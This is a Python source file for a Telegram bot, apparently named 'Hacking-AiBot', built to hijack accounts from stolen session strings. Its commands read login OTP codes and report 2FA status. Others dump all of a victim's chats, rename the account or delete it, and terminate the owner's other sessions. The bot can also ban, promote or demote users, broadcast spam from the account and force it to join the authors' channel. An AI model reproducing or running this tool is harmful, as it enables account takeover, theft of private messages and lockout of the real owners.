# Gladiators - Hacking-AiBot
# Copyright (C) 2022-Present Gladiators-Projects
# This was licensed under GNU General Public License v3.0 < https://github.com/Gladiators-Projects/Hacking-AiBot/blob/main/LICENSE >
#
# This file is a part of < https://github.com/Gladiators-Projects/Hacking-AiBot >

from telethon.errors import (
  ChatAdminRequiredError,
  FloodWaitError,
  MessageNotModifiedError,
  UserAdminInvalidError,
)
from telethon import events, custom
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl import functions
from telethon.tl.functions.messages import EditChatAdminRequest
from telethon.tl.functions.channels import EditBannedRequest, EditAdminRequest
from telethon.tl.types import (
  ChannelParticipantsAdmins,
  ChannelParticipantsKicked,
  ChatBannedRights,
  UserStatusEmpty,
  ChatAdminRights,
  UserStatusLastMonth,
  UserStatusLastWeek,
  UserStatusOffline,
  UserStatusOnline,
  UserStatusRecently,
)
from telethon.tl.functions.account import GetPasswordRequest as g
from telethon.tl.functions.account import GetAuthorizationsRequest
from telethon.sync import TelegramClient
from telethon.tl.functions.account import UpdateUsernameRequest
from telethon.sessions import StringSession
from telethon import functions, types
import asyncio
import io
import os
from asyncio import sleep
from io import BytesIO
from os import remove
from hackingaibot import BotClient
from prototype import API_ID, API_HASH
APIID = str(API_ID)

session = {}

banned_rights = ChatBannedRights(
    until_date=None,
    view_messages=True
)

##############################################################################################################################



########################################## Fetching session from the user #########################################################



##############################################################################################################################



@BotClient.on(events.NewMessage(pattern="^/string(?: |$)(.*)"))
async def _(event):
  try:
    strg = str(event.text[8:])
    session[event.sender_id] = strg
    string = session[event.sender_id]
    mat = "https://t.me/Gladiators_Projects"
    async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
      try:
        await victim(functions.channels.JoinChannelRequest(channel=mat))
      except:
        pass
    await event.reply("**String saved Successfully!!**")
  except Exception as e:
    print(e)
    xd = event.sender_id
    if xd in session:
      del session[xd]
    await event.reply("**OOPS!! Something went wrong!!**\n\n**I guess this string was terminated!!**\n\n**Try again:**\n\nSyntax:-\n/string <String Session>")

##############################################################################################################################



################################################# LOGIN GEAR #################################################################



##############################################################################################################################




@BotClient.on(events.NewMessage(incoming=True, pattern="^/phone(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        xd = await victim.get_me()
        numb = "+" + str(xd.phone)
        await event.reply(numb)
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)



@BotClient.on(events.NewMessage(incoming=True, pattern="^/pass(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        result = (await victim(g())).has_password
        if result is True:
          await event.reply("Yes, There's 2FA Password!!")
        else:
          await event.reply("There isn't any 2FA password!!")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/otp(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        async for msg in victim.iter_messages(777000):
          if msg:
            await event.reply(msg)
            break
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


##############################################################################################################################



################################################ ACCOUNT GEAR ################################################################



##############################################################################################################################




@BotClient.on(events.NewMessage(incoming=True, pattern="^/first(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[7:])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        await victim(functions.account.UpdateProfileRequest(
          first_name = mat
        ))
      await event.reply("**Changed first name successfully!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/profilepic(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      glad = await event.get_reply_message()
      media = await glad.download_media( "hackingaibot/downloads/")
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        await victim(UploadProfilePhotoRequest(
          await victim.upload_file(media)
        ))
      await event.reply("**Changed profile picture successfully!!**")
      os.remove(media)
    except Exception as e:
      await event.reply(f"**Reply to any media i.e photo/video bruh!**")


@BotClient.on(events.NewMessage(incoming=True, pattern="^/last(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[6:])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        await victim(functions.account.UpdateProfileRequest(
          last_name = mat
        ))
      await event.reply("**Changed last name successfully!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/username(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[10:])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        await victim(UpdateUsernameRequest(mat))
      await event.reply("**Changed username successfully!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/about(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[7:])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        await victim(functions.account.UpdateProfileRequest(
          about = mat
        ))
      await event.reply("**Changed about successfully!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/delete(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[8:])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        await victim(functions.account.DeleteAccountRequest(
          reason = mat
        ))
      await event.reply("**Deleted account successfully!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)



@BotClient.on(events.NewMessage(incoming=True, pattern="^/details(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        xd = await victim.get_me()
        await event.reply(str(xd))
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/terminate(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        x = []
        result = await victim(GetAuthorizationsRequest())
        for m in result.authorizations:
          x.append(m.hash)
        for i in x:
          if str(i) != "0":
            h = int(i)
            await victim(functions.account.ResetAuthorizationRequest(hash=h))
      await event.reply("**Terminated all sessions successfully!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)




@BotClient.on(events.NewMessage(incoming=True, pattern="^/whole(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    message_id = event.message.id
    try:
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        dialogs = await victim.get_dialogs()
        gldtr = str(dialogs)
        l = await victim.get_me()
        name = str(l.first_name)
        with io.BytesIO(str.encode(gldtr)) as out_file:
          out_file.name = "Data.txt"
          await event.client.send_file(
            event.chat_id,
            out_file,
            force_document=True,
            thumb="hackingaibot/resources/Gladiators.jpeg",
            allow_cache = False,
            caption=f"Here's the whole data of {name}\n\n© @Gladiators_Projects",
            reply_to=message_id,
          )
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)



##############################################################################################################################



################################################## CHAT GEAR #################################################################



##############################################################################################################################




@BotClient.on(events.NewMessage(incoming=True, pattern="^/ban(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[5:])
      lst = mat.split(" ", 1)
      cht = int(lst[0])
      usr = str(lst[1])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        result = await victim.get_participants(mat)
        if not result:
          return await event.reply("It seems like victim is not admin in that group.")
        if usr not in result:
          return await event.reply("User isn't in that chat bruhh!")
        admins = await victim.get_participants(mat, filter=ChannelParticipantsAdmins)
        admins_id = [i.id for i in admins]
        if usr not in admins_id:
          try:
            await victim(EditBannedRequest(cht, usr, ChatBannedRights(until_date=None,view_messages=True)))
            await event.reply("**Banned user successfully!!**")
          except:
            await event.reply("**OOPS!! Something went wrong!!**\n\n**I am unable to ban that user from that chat!!**")
         
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/send(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[6:])
      dat = mat.split(" ", 1)
      cht = int(dat[0])
      msg = dat[1]
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        await victim.send_message(cht, msg)
      await event.reply("**Sent message successfully!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/promote(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[9:])
      dat = mat.split(" ", 2)
      chat = int(dat[0])
      user = str(dat[1])
      if user.isdigit() or user[0] != '@':
        return await event.reply(":Wrong Syntax:\nUse /help command to know syntax.")
      if len(dat) == 3:
        rank = str(dat[2])
      else:
        rank = "Admin"
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        await victim.edit_admin(chat, user, is_admin=True, anonymous=False, title= rank)
      await event.reply("**Promoted successfully!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)

@BotClient.on(events.NewMessage(incoming=True, pattern="^/promoteanon(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[13:])
      dat = mat.split(" ", 2)
      chat = int(dat[0])
      user = str(dat[1])
      if user.isdigit() or user[0] != '@':
        return await event.reply(":Wrong Syntax:\nUse /help command to know syntax.")
      if len(dat) == 3:
        rank = str(dat[2])
      else:
        rank = "Admin"
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        await victim.edit_admin(chat, user, is_admin=True, title= rank)
      await event.reply("**Promoted user as anonymous successfully!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/demoteall(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = int(event.text[11:])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        result = await victim.get_participants(mat)
        if not result:
          return await event.reply("It seems like victim dont have ban users permission in this group.")
        admins = await victim.get_participants(
          mat, filter=ChannelParticipantsAdmins
        )
        admins_id = [i.id for i in admins]
        for i in admins_id:
          try:
            await victim.edit_admin(mat, i, is_admin=False)
          except:
            pass
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/demote(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[8:])
      dat = mat.split(" ", 1)
      chat = int(dat[0])
      user = str(dat[1])
      if user.isdigit() or user[0] != '@':
        return await event.reply(":Wrong Syntax:\nUse /help command to know syntax.")
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        await victim.edit_admin(chat, user, is_admin=False)
      await event.reply("**Demoted user successfully!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/join(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[6:])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        try:
          await victim(functions.channels.JoinChannelRequest(channel=mat))
          await event.reply("**Joined successfully!!**")
        except:
          await event.reply("**OOPS!! Something went wrong!!**\n\n**I guess the user is already there!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/pjoin(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[7:])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        try:
          await victim(ImportChatInviteRequest(mat))
          await event.reply("**Joined successfully!!**")
        except:
          await event.reply("**OOPS!! Something went wrong!!**\n\n**I guess the user is already there!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)


@BotClient.on(events.NewMessage(incoming=True, pattern="^/leave(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = int(event.text[7:])
      string = session[event.sender_id]
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        try:
          await victim(LeaveChannelRequest(mat))
          await event.reply("**Left successfully!!**")
        except:
          await event.reply("**OOPS!! Something went wrong!!**\n\n**I guess the user is not there!!**")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)



##############################################################################################################################



################################################# GLOBAL GEAR ################################################################



##############################################################################################################################





@BotClient.on(events.NewMessage(incoming=True, pattern="^/gcast(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      msg = str(event.text[7:])
      string = session[event.sender_id]
      dn = 0
      er = 0
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        async for x in victim.iter_dialogs():
          if x.is_group or x.is_user or x.is_channel:
            try:
              cht = x.entity.id
              await victim.send_message(cht, msg)
              dn += 1
            except:
              er += 1
      await event.reply(f"**Broadcasted message in all chats including channels successfully !!**\nDone in {dn} chats.\nError in {er} chats.")
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)

@BotClient.on(events.NewMessage(incoming=True, pattern="^/gban(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      user = str(event.text[6:])
      if user.isdigit() or user[0] != '@':
        return await event.reply(":Wrong Syntax:\nUse /help command to know syntax.")
      string = session[event.sender_id]
      dn = 0
      er = 0
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        usr_id = await victim.get_entity(user)
        user_id = int(usr_id.id)
        async for x in victim.iter_dialogs():
          if x.is_group or x.is_channel:
            try:
              chat = int(x.entity.id)
              result = await victim.get_participants(chat)
              if not result:
                pass
              admins = await victim.get_participants(chat, filter=ChannelParticipantsAdmins)
              if user_id in admins:
                try:
                  await victim.edit_admin(chat, user, is_admin=False)
                except:
                  pass
              try:
                await victim(EditBannedRequest(chat, user, ChatBannedRights(until_date=None,view_messages=True)))
                dn += 1
              except:
                er += 1
            except:
              pass
        await event.reply(f"**Banned user globally!!**\nDone in {dn} chats.\nError in {er} chats.")  
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)



@BotClient.on(events.NewMessage(incoming=True, pattern="^/gpromote(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      mat = str(event.text[10:])
      lst = mat.split(" ", 1)
      user = str(lst[0])
      if user.isdigit() or user[0] != '@':
        return await event.reply(":Wrong Syntax:\nUse /help command to know syntax.")
      if len(lst) == 2:
        rank = str(lst[1])
      else:
        rank = "Admin"
      string = session[event.sender_id]
      dn = 0
      er = 0
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        async for x in victim.iter_dialogs():
          if x.is_group or x.is_channel:
            try:
              chat = int(x.entity.id)
              result = await victim.get_participants(chat)
              if not result:
                pass
              try:
                try:
                  await victim.edit_admin(chat, user, is_admin=True, anonymous=False, title= rank)
                  dn += 1
                except:
                  users = []
                  users.append(user)
                  await victim(functions.channels.InviteToChannelRequest(channel=chat, users=users))
                  await victim.edit_admin(chat, user, is_admin=True, anonymous=False, title= rank)
                  dn+=1
              except:
                er += 1
            except:
              pass
      await event.reply(f"**Promoted user globally!!**\nDone in {dn} chats.\nError in {er} chats.")  
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)




@BotClient.on(events.NewMessage(incoming=True, pattern="^/gdemote(?: |$)(.*)"))
async def _(event):
  if event.sender_id not in session.keys():
    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
  else:
    try:
      user = str(event.text[10:])
      if user.isdigit() or user[0] != '@':
        return await event.reply(":Wrong Syntax:\nUse /help command to know syntax.")
      string = session[event.sender_id]
      dn = 0
      er = 0
      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
        usr_id = await victim.get_entity(user)
        user_id = int(usr_id.id)
        async for x in victim.iter_dialogs():
          if x.is_group or x.is_channel:
            try:
              chat = int(x.entity.id)
              result = await victim.get_participants(chat)
              if not result:
                pass
              admins = await victim.get_participants(chat, filter=ChannelParticipantsAdmins)
              if user_id not in admins:
                return
              try:
                await victim.edit_admin(chat, user, is_admin=False)
                dn += 1
              except:
                er += 1
            except:
              pass
        await event.reply(f"**Demoted user globally!!**\nDone in {dn} chats.\nError in {er} chats.")  
    except Exception as e:
      eror = str(e)
      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)



__mod_name__ = "hacking"
